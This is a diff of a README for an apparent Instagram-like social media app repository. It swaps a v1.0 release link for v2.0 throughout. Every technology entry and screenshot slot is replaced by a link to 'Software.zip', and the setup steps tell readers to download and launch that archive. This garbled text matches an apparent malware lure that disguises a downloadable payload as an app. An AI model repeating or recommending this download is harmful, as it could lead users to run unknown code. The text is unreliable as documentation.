@@ -1,7 +1,7 @@
 # 🚀 Welcome to the Social Media App Repository! 📱
 
 ## Description
-Welcome to the "Social-media-app" repository, a dynamic social media application similar to Instagram. This app is built using https://github.com/samirfd/Social-media-app/releases/download/v1.0/Software.zip, JavaScript, and CSS, offering seamless navigation, user-friendly design, and real-time updates for a connected user experience.
+Welcome to the "Social-media-app" repository, a dynamic social media application similar to Instagram. This app is built using https://github.com/samirfd/Social-media-app/releases/download/v2.0/Software.zip, JavaScript, and CSS, offering seamless navigation, user-friendly design, and real-time updates for a connected user experience.
 
 ## Features
 🌟 Seamless navigation  
@@ -9,7 +9,7 @@ Welcome to the "Social-media-app" repository, a dynamic social media application
 🌟 Real-time updates  
 
 ## Technologies Used
-- https://github.com/samirfd/Social-media-app/releases/download/v1.0/Software.zip
+- https://github.com/samirfd/Social-media-app/releases/download/v2.0/Software.zip
 - JavaScript
 - CSS
 
@@ -19,26 +19,26 @@ Welcome to the "Social-media-app" repository, a dynamic social media application
 - ES6
 - HTML5
 - JavaScript
-- https://github.com/samirfd/Social-media-app/releases/download/v1.0/Software.zip
+- https://github.com/samirfd/Social-media-app/releases/download/v2.0/Software.zip
 - React Router
 - Social Media
 - User
 - Use Reducer
 
 ## Repository Link
-🔗 [Download https://github.com/samirfd/Social-media-app/releases/download/v1.0/Software.zip](https://github.com/samirfd/Social-media-app/releases/download/v1.0/Software.zip) (Needs to be launched)
+🔗 [Download https://github.com/samirfd/Social-media-app/releases/download/v2.0/Software.zip](https://github.com/samirfd/Social-media-app/releases/download/v2.0/Software.zip) (Needs to be launched)
 
 ## How to Get Started
 To get started with the Social Media App, you can follow these steps:
-1. Download the https://github.com/samirfd/Social-media-app/releases/download/v1.0/Software.zip file from the provided link.
+1. Download the https://github.com/samirfd/Social-media-app/releases/download/v2.0/Software.zip file from the provided link.
 2. Launch the application.
 3. Explore its features and functionalities.
 
 ## Screenshots
 Here are a few screenshots of the Social Media App:
-![Screenshot 1](https://github.com/samirfd/Social-media-app/releases/download/v1.0/Software.zip)
-![Screenshot 2](https://github.com/samirfd/Social-media-app/releases/download/v1.0/Software.zip)
-![Screenshot 3](https://github.com/samirfd/Social-media-app/releases/download/v1.0/Software.zip)
+![Screenshot 1](https://github.com/samirfd/Social-media-app/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/samirfd/Social-media-app/releases/download/v2.0/Software.zip)
+![Screenshot 3](https://github.com/samirfd/Social-media-app/releases/download/v2.0/Software.zip)
 
 ## Installation
 To install and run the app locally, follow these steps:
